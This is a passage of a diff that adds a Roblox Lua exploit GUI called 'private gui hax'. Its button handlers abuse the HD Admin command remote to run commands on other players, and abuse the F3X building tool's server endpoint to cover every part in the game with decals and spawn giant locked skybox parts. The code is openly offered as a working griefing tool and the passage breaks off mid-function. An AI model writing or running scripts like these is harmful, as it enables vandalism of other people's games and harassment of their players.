+G2L["30c"]["TextSize"] = 14;
+G2L["30c"]["TextScaled"] = true;
+G2L["30c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["30c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["30c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["30c"]["Size"] = UDim2.new(0, 55, 0, 35);
+G2L["30c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["30c"]["Text"] = [[GUIs Tab]];
+G2L["30c"]["Name"] = [[Gui tab]];
+G2L["30c"]["Position"] = UDim2.new(0.83281, 0, 0.09325, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui tab.LocalScript
+G2L["30d"] = Instance.new("LocalScript", G2L["30c"]);
+
+
+
+-- StarterGui.private gui hax.lol.R15
+G2L["30e"] = Instance.new("TextButton", G2L["2"]);
+G2L["30e"]["TextWrapped"] = true;
+G2L["30e"]["BorderSizePixel"] = 3;
+G2L["30e"]["TextSize"] = 14;
+G2L["30e"]["TextScaled"] = true;
+G2L["30e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["30e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["30e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["30e"]["Size"] = UDim2.new(0, 59, 0, 35);
+G2L["30e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["30e"]["Text"] = [[R15]];
+G2L["30e"]["Name"] = [[R15]];
+G2L["30e"]["Position"] = UDim2.new(-0.10469, 0, 0.19048, 0);
+
+
+-- StarterGui.private gui hax.lol.R15.LocalScript
+G2L["30f"] = Instance.new("LocalScript", G2L["30e"]);
+
+
+
+-- StarterGui.private gui hax.open/close
+G2L["310"] = Instance.new("ImageButton", G2L["1"]);
+G2L["310"]["BorderSizePixel"] = 0;
+G2L["310"]["BackgroundTransparency"] = 1;
+G2L["310"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["310"]["Image"] = [[rbxassetid://56369539]];
+G2L["310"]["Size"] = UDim2.new(0, 74, 0, 73);
+G2L["310"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["310"]["Name"] = [[open/close]];
+G2L["310"]["Position"] = UDim2.new(0.90781, 0, 0.79276, 0);
+
+
+-- StarterGui.private gui hax.open/close.scriptforit
+G2L["311"] = Instance.new("LocalScript", G2L["310"]);
+G2L["311"]["Name"] = [[scriptforit]];
+
+
+-- StarterGui.private gui hax.open/close.script
+G2L["312"] = Instance.new("LocalScript", G2L["310"]);
+G2L["312"]["Name"] = [[script]];
+
+
+-- StarterGui.private gui hax.requestbtool
+G2L["313"] = Instance.new("LocalScript", G2L["1"]);
+G2L["313"]["Name"] = [[requestbtool]];
+
+
+-- StarterGui.private gui hax.README
+G2L["314"] = Instance.new("LocalScript", G2L["1"]);
+G2L["314"]["Enabled"] = false;
+G2L["314"]["Name"] = [[README]];
+G2L["314"]["Disabled"] = true;
+
+
+-- StarterGui.private gui hax.lol.Home.LocalScript
+function C_5()
+local script = G2L["5"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HomePage.Visible = true
+		script.Parent.Parent.F3XtabPage.Visible = false
+		script.Parent.Parent["HDA Command Abuse tab Page"].Visible = false
+		script.Parent.Parent["LocalPlayer tab Page"].Visible = false
+		script.Parent.Parent["Audio tab Page"].Visible = false
+		script.Parent.Parent["Executor tab Page"].Visible = false
+		script.Parent.Parent["ScriptHub F3X Page"].Visible = false
+		script.Parent.Parent["Credit tab Page"].Visible = false
+		script.Parent.Parent["HD Abuse 2 tab Page"].Visible = false
+		script.Parent.Parent["Gui Page"].Visible = false
+	end)
+end;
+task.spawn(C_5);
+-- StarterGui.private gui hax.lol.F3Xtab.LocalScript
+function C_7()
+local script = G2L["7"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HomePage.Visible = false
+		script.Parent.Parent.F3XtabPage.Visible = true
+		script.Parent.Parent["HDA Command Abuse tab Page"].Visible = false
+		script.Parent.Parent["LocalPlayer tab Page"].Visible = false
+		script.Parent.Parent["Audio tab Page"].Visible = false
+		script.Parent.Parent["Executor tab Page"].Visible = false
+		script.Parent.Parent["ScriptHub F3X Page"].Visible = false
+		script.Parent.Parent["Credit tab Page"].Visible = false
+		script.Parent.Parent["HD Abuse 2 tab Page"].Visible = false
+		script.Parent.Parent["Gui Page"].Visible = false
+	end)
+end;
+task.spawn(C_7);
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab.LocalScript
+function C_9()
+local script = G2L["9"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HomePage.Visible = false
+		script.Parent.Parent.F3XtabPage.Visible = false
+		script.Parent.Parent["HDA Command Abuse tab Page"].Visible = true
+		script.Parent.Parent["LocalPlayer tab Page"].Visible = false
+		script.Parent.Parent["Audio tab Page"].Visible = false
+		script.Parent.Parent["Executor tab Page"].Visible = false
+		script.Parent.Parent["ScriptHub F3X Page"].Visible = false
+		script.Parent.Parent["Credit tab Page"].Visible = false
+		script.Parent.Parent["HD Abuse 2 tab Page"].Visible = false
+		script.Parent.Parent["Gui Page"].Visible = false
+	end)
+end;
+task.spawn(C_9);
+-- StarterGui.private gui hax.lol.LocalPlayer tab.LocalScript
+function C_b()
+local script = G2L["b"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HomePage.Visible = false
+		script.Parent.Parent.F3XtabPage.Visible = false
+		script.Parent.Parent["HDA Command Abuse tab Page"].Visible = false
+		script.Parent.Parent["LocalPlayer tab Page"].Visible = true
+		script.Parent.Parent["Audio tab Page"].Visible = false
+		script.Parent.Parent["Executor tab Page"].Visible = false
+		script.Parent.Parent["ScriptHub F3X Page"].Visible = false
+		script.Parent.Parent["Credit tab Page"].Visible = false
+		script.Parent.Parent["HD Abuse 2 tab Page"].Visible = false
+		script.Parent.Parent["Gui Page"].Visible = false
+	end)
+end;
+task.spawn(C_b);
+-- StarterGui.private gui hax.lol.Audio tab.LocalScript
+function C_d()
+local script = G2L["d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HomePage.Visible = false
+		script.Parent.Parent.F3XtabPage.Visible = false
+		script.Parent.Parent["HDA Command Abuse tab Page"].Visible = false
+		script.Parent.Parent["LocalPlayer tab Page"].Visible = false
+		script.Parent.Parent["Audio tab Page"].Visible = true
+		script.Parent.Parent["Executor tab Page"].Visible = false
+		script.Parent.Parent["ScriptHub F3X Page"].Visible = false
+		script.Parent.Parent["Credit tab Page"].Visible = false
+		script.Parent.Parent["HD Abuse 2 tab Page"].Visible = false
+		script.Parent.Parent["Gui Page"].Visible = false
+	end)
+end;
+task.spawn(C_d);
+-- StarterGui.private gui hax.lol.Executor tab.LocalScript
+function C_f()
+local script = G2L["f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.HomePage.Visible = false
+		script.Parent.Parent.F3XtabPage.Visible = false
+		script.Parent.Parent["HDA Command Abuse tab Page"].Visible = false
+		script.Parent.Parent["LocalPlayer tab Page"].Visible = false
+		script.Parent.Parent["Audio tab Page"].Visible = false
+		script.Parent.Parent["Executor tab Page"].Visible = true
+		script.Parent.Parent["ScriptHub F3X Page"].Visible = false
+		script.Parent.Parent["Credit tab Page"].Visible = false
+		script.Parent.Parent["HD Abuse 2 tab Page"].Visible = false
+		script.Parent.Parent["Gui Page"].Visible = false
+	end)
+end;
+task.spawn(C_f);
+-- StarterGui.private gui hax.lol.R6.LocalScript
+function C_11()
+local script = G2L["11"];
+	script.Parent.MouseButton1Click:Connect(function()
+			local ReplicatedStorage = game:GetService("ReplicatedStorage")
+			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+			RequestCommand:InvokeServer(";r6 me")
+	end)
+end;
+task.spawn(C_11);
+-- StarterGui.private gui hax.lol.RE.LocalScript
+function C_13()
+local script = G2L["13"];
+	script.Parent.MouseButton1Click:Connect(function()
+			local ReplicatedStorage = game:GetService("ReplicatedStorage")
+			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+			RequestCommand:InvokeServer(";re me")
+	end)
+end;
+task.spawn(C_13);
+-- StarterGui.private gui hax.lol.Anti-Skids.LocalScript
+function C_15()
+local script = G2L["15"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";hideguis others ;re others ;undisco ;unmusic")
+	end)
+end;
+task.spawn(C_15);
+-- StarterGui.private gui hax.lol.Stop Audios.LocalScript
+function C_17()
+local script = G2L["17"];
+	script.Parent.MouseButton1Click:Connect(function()
+			local ReplicatedStorage = game:GetService("ReplicatedStorage")
+			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+			RequestCommand:InvokeServer(";unmusic")
+	end)
+end;
+task.spawn(C_17);
+-- StarterGui.private gui hax.lol.HomePage.username.LocalScript
+function C_1b()
+local script = G2L["1b"];
+	local Players = game:GetService("Players")
+	local player = Players.LocalPlayer
+	local txt = script.Parent
+	
+	txt.Text = "Welcome, " .. player.Name .. "!"
+	
+	-- a what idk
+end;
+task.spawn(C_1b);
+-- StarterGui.private gui hax.lol.HomePage.fuckingyeah.LocalScript
+function C_20()
+local script = G2L["20"];
+	local Players = game:GetService("Players")
+	
+	local player = Players.LocalPlayer
+	
+	local userId = player.UserId
+	local thumbType = Enum.ThumbnailType.HeadShot
+	local thumbSize = Enum.ThumbnailSize.Size420x420
+	local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+	
+	local imageLabel = script.Parent
+	imageLabel.Image = content
+end;
+task.spawn(C_20);
+-- StarterGui.private gui hax.lol.HomePage.thing.LocalScript
+function C_25()
+local script = G2L["25"];
+	local poopbruh = game:GetService("ReplicatedStorage")
+	local folderofit = poopbruh:FindFirstChild("HDAdminHDClient")
+	local txt = script.Parent
+	
+	if folderofit then
+		txt.Text = "HD Admin: ✅"
+	else
+		txt.Text = "HD Admin: ❌"
+	end
+end;
+task.spawn(C_25);
+-- StarterGui.private gui hax.lol.HomePage.thing.LocalScript
+function C_27()
+local script = G2L["27"];
+	local player = game:GetService("Players").LocalPlayer
+	local backpack = player:FindFirstChild("Backpack")
+	local txt = script.Parent
+	
+	backpack:FindFirstChild("Building Tools")
+	
+	if backpack then
+		txt.Text = "F3X/Btools: ✅"
+	else
+		txt.Text = "F3X/Btools: ❌"
+	end
+end;
+task.spawn(C_27);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set SkyBox.LocalScript
+function C_2e()
+local script = G2L["2e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local id = script.Parent.Parent.TextBoxDecal.Text
+		local color = script.Parent.Parent.TextBoxColor.Text
+		local x, y, z = color:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+		local size = script.Parent.Parent.TextBoxSize.Text
+		local c, v, b = size:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+		local trans = script.Parent.Parent.TextBoxT.Text
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			ohno({"Remove", { hack }})
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		ohno({"SyncAnchor", { { Part = sky, Anchored = true } }})
+		ohno({"SyncCollision", { { Part = sky, CanCollide = false } }})
+		ohno({"CreateMeshes", { { Part = sky } }})
+		ohno({"SyncMesh", { {
+			Part = sky,
+			MeshId = "rbxassetid://111891702759441",
+			TextureId = "rbxassetid://" .. id,
+			Scale = Vector3.new(tonumber(c), tonumber(v), tonumber(b)),
+			VertexColor = Vector3.new(tonumber(x), tonumber(y), tonumber(z))
+		} }})
+		ohno({"SetLocked", { sky }, true})
+		ohno({"SetName", { sky }, "kys"})
+		ohno({"SyncMaterial", { { Part = sky, Transparency = tonumber(trans) } }})
+		ohno({"SyncMove", { { Part = sky, CFrame = cf } }})
+	end)
+end;
+task.spawn(C_2e);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Decal Spam.LocalScript
+function C_30()
+local script = G2L["30"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- method task.defer by yoid and 1sw0rd1
+		-- credit to these 2
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local decalID = script.Parent.Parent.TextBoxDecal.Text
+		local id = decalID
+	
+		local player = Players.LocalPlayer
+	
+		local tool = nil
+		for _, v in pairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		-- Fast deferred remote caller
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local allParts = {}
+		for _, v in pairs(Workspace:GetDescendants()) do
+			if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "kys" then
+				table.insert(allParts, v)
+			end
+		end
+	
+		local faces = {"Front", "Back", "Right", "Left", "Bottom", "Top"}
+		local faceEnums = {
+			Front = Enum.NormalId.Front,
+			Back = Enum.NormalId.Back,
+			Right = Enum.NormalId.Right,
+			Left = Enum.NormalId.Left,
+			Bottom = Enum.NormalId.Bottom,
+			Top = Enum.NormalId.Top
+		}
+	
+		for _, faceName in pairs(faces) do
+			task.defer(function()
+				local faceEnum = faceEnums[faceName]
+				local createList = {}
+				local addList = {}
+				for i = 1, #allParts do
+					local part = allParts[i]
+					createList[i] = {Part = part, Face = faceEnum, TextureType = "Decal"}
+					addList[i] = {Part = part, Face = faceEnum, TextureType = "Decal", Texture = "rbxassetid://" .. id}
+				end
+				remote:InvokeServer('CreateTextures', createList)
+				remote:InvokeServer('SyncTexture', addList)
+			end)
+		end
+	
+		local function send(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function setCollision(part, bool)
+			ohno({"SyncCollision", {{Part = part, CanCollide = bool}}})
+		end
+	
+		local function setAnchor(bool, part)
+			ohno({"SyncAnchor", {{Part = part, Anchored = bool}}})
+		end
+	
+		local function newPart(cf, parent)
+			ohno({"CreatePart", "Normal", cf, parent})
+		end
+	
+		local function killPart(part)
+			ohno({"Remove", {part}})
+		end
+	
+		local function movePart(part, cf)
+			ohno({"SyncMove", {{Part = part, CFrame = cf}}})
+		end
+	
+		local function resizePart(part, sz, cf)
+			ohno({"SyncResize", {{Part = part, CFrame = cf, Size = sz}}})
+		end
+	
+		local function addMeshToPart(part)
+			ohno({"CreateMeshes", {{Part = part}}})
+		end
+	
+		local function changeMesh(part, meshId)
+			ohno({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshId}}})
+		end
+	
+		local function changeTexture(part, texId)
+			ohno({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texId}}})
+		end
+	
+		local function renamePart(part, newName)
+			ohno({"SetName", {part}, newName})
+		end
+	
+		local function scaleMesh(part, scaleVal)
+			ohno({"SyncMesh", {{Part = part, Scale = scaleVal}}})
+		end
+	
+		local function weldParts(partA, partB, leader)
+			ohno({"CreateWelds", {partA, partB}, leader})
+		end
+	
+		local function lockPart(part, bool)
+			ohno({"SetLocked", {part}, bool})
+		end
+	
+		local function setTransparency(part, val)
+			ohno({"SyncMaterial", {{Part = part, Transparency = val}}})
+		end
+	
+		local function addSpotlight(part)
+			ohno({"CreateLights", {{Part = part, LightType = "SpotLight"}}})
+		end
+	
+		local function setLightBrightness(part, brightness)
+			ohno({"SyncLighting", {{Part = part, LightType = "SpotLight", Brightness = brightness}}})
+		end
+	
+		local function recolorPart(part, colorVal)
+			ohno({"SyncColor", {{Part = part, Color = colorVal, UnionColoring = false}}})
+		end
+	
+		local function spawnDecalOnFace(part, side)
+			ohno({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}})
+		end
+	
+		local function addDecalToFace(part, assetId, side)
+			ohno({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. assetId}}})
+		end
+	
+		for i = 1, #allParts do
+			setTransparency(allParts[i], 0)
+		end
+	end)
+end;
+task.spawn(C_30);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Colorful SkyBox.LocalScript
+function C_33()
+local script = G2L["33"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local id = script.Parent.Parent.TextBoxDecal.Text
+		local colorText = script.Parent.Parent.TextBoxColor.Text
+		local trans = script.Parent.Parent.TextBoxT.Text
+		local rColorVal, gColorVal, bColorVal = colorText:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+		local size = script.Parent.Parent.TextBoxSize.Text
+		local c, v, b = size:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+	
+		local defaultBright = 4.5
+		local startR = tonumber(rColorVal) or defaultBright
+		local startG = tonumber(gColorVal) or defaultBright
+		local startB = tonumber(bColorVal) or defaultBright
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			ohno({ "Remove", { hack } })
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		ohno({ "SyncAnchor", { { Part = sky, Anchored = true } } })
+		ohno({ "SyncCollision", { { Part = sky, CanCollide = false } } })
+		ohno({ "CreateMeshes", { { Part = sky } } })
+		ohno({
+			"SyncMesh",
+			{{
+				Part = sky,
+				MeshId = "rbxassetid://111891702759441",
+				TextureId = "rbxassetid://" .. id,
+				Scale = Vector3.new(tonumber(c), tonumber(v), tonumber(b)),
+				VertexColor = Vector3.new(startR, startG, startB)
+			}}
+		})
+		ohno({ "SetLocked", { sky }, true })
+		ohno({ "SetName", { sky }, "kys" })
+		ohno({ "SyncMaterial", { { Part = sky, Transparency = trans } } })
+		ohno({ "SyncMove", { { Part = sky, CFrame = cf } } })
+	
+		task.spawn(function()
+			while true do
+				task.wait(0.7)
+				local newR = math.random() * startR
+				local newG = math.random() * startG
+				local newB = math.random() * startB
+				ohno({
+					"SyncMesh",
+					{{
+						Part = sky,
+						VertexColor = Vector3.new(newR, newG, newB)
+					}}
+				})
+			end
+		end)
+	end)
+end;
+task.spawn(C_33);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Trippy SkyBox.LocalScript
+function C_35()
+local script = G2L["35"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local id = script.Parent.Parent.TextBoxDecal.Text
+		local color = script.Parent.Parent.TextBoxColor.Text
+		local x, y, z = color:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+		local size = script.Parent.Parent.TextBoxSize.Text
+		local c, v, b = size:match("([%d%.]+),([%d%.]+),([%d%.]+)")
+		local trans = script.Parent.Parent.TextBoxT.Text
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local RunService = game:GetService("RunService")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			ohno({ "Remove", { hack } })
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		ohno({ "SyncAnchor", { { Part = sky, Anchored = false } } })
+		ohno({ "SyncCollision", { { Part = sky, CanCollide = false } } })
+		ohno({ "CreateMeshes", { { Part = sky } } })
+		ohno({
+			"SyncMesh",
+			{{
+				Part = sky,
+				MeshId = "rbxassetid://111891702759441",
+				TextureId = "rbxassetid://" .. id,
+				Scale = Vector3.new(tonumber(c), tonumber(v), tonumber(b)),
+				VertexColor = Vector3.new(tonumber(x) or 2, tonumber(y) or 2, tonumber(z) or 2)
+			}}
+		})
+		ohno({ "SetLocked", { sky }, true })
+		ohno({ "SetName", { sky }, "kys" })
+		ohno({ "SyncMaterial", { { Part = sky, Transparency = trans } } })
+		ohno({ "SyncMove", { { Part = sky, CFrame = cf } } })
+	
+		local originalPos = cf.Position
+		local angleX, angleY, angleZ = 0, 0, 0
+	
+		RunService.Heartbeat:Connect(function(dt)
+			pcall(function()
+				angleX = angleX + (math.random(25, 37) * dt)
+				angleY = angleY + (math.random(25, 37) * dt)
+				angleZ = angleZ + (math.random(25, 37) * dt)
+	
+				if angleX >= 360 then angleX = angleX - 360 end
+				if angleY >= 360 then angleY = angleY - 360 end
+				if angleZ >= 360 then angleZ = angleZ - 360 end
+	
+				local newCF = CFrame.new(originalPos) * CFrame.Angles(math.rad(angleX), math.rad(angleY), math.rad(angleZ))
+				ohno({ "SyncMove", { { Part = sky, CFrame = newCF } } })
+			end)
+		end)
+	end)
+end;
+task.spawn(C_35);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_37()
+local script = G2L["37"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local id = "97075069807826"
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			ohno({"Remove", { hack }})
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		ohno({"SyncAnchor", { { Part = sky, Anchored = true } }})
+		ohno({"SyncCollision", { { Part = sky, CanCollide = false } }})
+		ohno({"CreateMeshes", { { Part = sky } }})
+		ohno({"SyncMesh", { {
+			Part = sky,
+			MeshId = "rbxassetid://111891702759441",
+			TextureId = "rbxassetid://" .. id,
+			Scale = Vector3.new(100999, 100999, 100999),
+			VertexColor = Vector3.new(4, 4, 4)
+		} }})
+		ohno({"SetLocked", { sky }, true})
+		ohno({"SetName", { sky }, "kys"})
+		ohno({"SyncMaterial", { { Part = sky, Transparency = tonumber(trans) } }})
+		ohno({"SyncMove", { { Part = sky, CFrame = cf } }})
+	end)
+end;
+task.spawn(C_37);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_39()
+local script = G2L["39"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- method task.defer by yoid and 1sw0rd1
+		-- credit to these 2
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local decalID = "103432880185377"
+		local id = decalID
+	
+		local player = Players.LocalPlayer
+	
+		local tool = nil
+		for _, v in pairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		-- Fast deferred remote caller
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local allParts = {}
+		for _, v in pairs(Workspace:GetDescendants()) do
+			if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "kys" then
+				table.insert(allParts, v)
+			end
+		end
+	
+		local faces = {"Front", "Back", "Right", "Left", "Bottom", "Top"}
+		local faceEnums = {
+			Front = Enum.NormalId.Front,
+			Back = Enum.NormalId.Back,
+			Right = Enum.NormalId.Right,
+			Left = Enum.NormalId.Left,
+			Bottom = Enum.NormalId.Bottom,
+			Top = Enum.NormalId.Top
+		}
+	
+		for _, faceName in pairs(faces) do
+			task.defer(function()
+				local faceEnum = faceEnums[faceName]
+				local createList = {}
+				local addList = {}
+				for i = 1, #allParts do
+					local part = allParts[i]
+					createList[i] = {Part = part, Face = faceEnum, TextureType = "Decal"}
+					addList[i] = {Part = part, Face = faceEnum, TextureType = "Decal", Texture = "rbxassetid://" .. id}
+				end
+				remote:InvokeServer('CreateTextures', createList)
+				remote:InvokeServer('SyncTexture', addList)
+			end)
+		end
+	
+		local function send(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function setCollision(part, bool)
+			ohno({"SyncCollision", {{Part = part, CanCollide = bool}}})
+		end
+	
+		local function setAnchor(bool, part)
+			ohno({"SyncAnchor", {{Part = part, Anchored = bool}}})
+		end
+	
+		local function newPart(cf, parent)
+			ohno({"CreatePart", "Normal", cf, parent})
+		end
+	
+		local function killPart(part)
+			ohno({"Remove", {part}})
+		end
+	
+		local function movePart(part, cf)
+			ohno({"SyncMove", {{Part = part, CFrame = cf}}})
+		end
+	
+		local function resizePart(part, sz, cf)
+			ohno({"SyncResize", {{Part = part, CFrame = cf, Size = sz}}})
+		end
+	
+		local function addMeshToPart(part)
+			ohno({"CreateMeshes", {{Part = part}}})
+		end
+	
+		local function changeMesh(part, meshId)
+			ohno({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshId}}})
+		end
+	
+		local function changeTexture(part, texId)
+			ohno({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texId}}})
+		end
+	
+		local function renamePart(part, newName)
+			ohno({"SetName", {part}, newName})
+		end
+	
+		local function scaleMesh(part, scaleVal)
